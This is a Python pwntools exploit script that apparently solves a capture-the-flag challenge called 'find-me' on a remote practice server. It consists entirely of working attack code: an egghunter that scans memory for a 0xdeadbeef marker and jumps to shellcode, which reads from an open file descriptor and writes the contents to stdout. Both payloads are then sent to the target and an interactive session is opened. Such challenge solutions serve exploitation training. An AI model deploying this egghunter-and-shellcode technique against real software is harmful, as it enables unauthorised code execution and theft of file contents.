#!/usr/bin/env python2

from pwn import *

def start():
    prog  = "./find-me"
    ip   = "plsdonthaq.me"
    port = 3004

    if args.REMOTE:
        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

p = start()

egghunter = asm("""
egg_hunter:
    inc eax
    cmp dword ptr [eax], 0xdeadbeef
    jne egg_hunter

    add eax, 4
    call eax
""")

egg = 0xdeadbeef
payload = asm("""
    mov eax, 0x03
    mov ebx, 0x3e8
    mov ecx, esp
    mov edx, 0x3e8

    int 0x80

    mov edx, eax
    mov eax, 0x04
    mov ebx, 0x1
    mov ecx, esp

    int 0x80
""")

p.sendlineafter("shellcode", egghunter)
p.sendlineafter("shellcode", p32(egg) + payload)

p.interactive()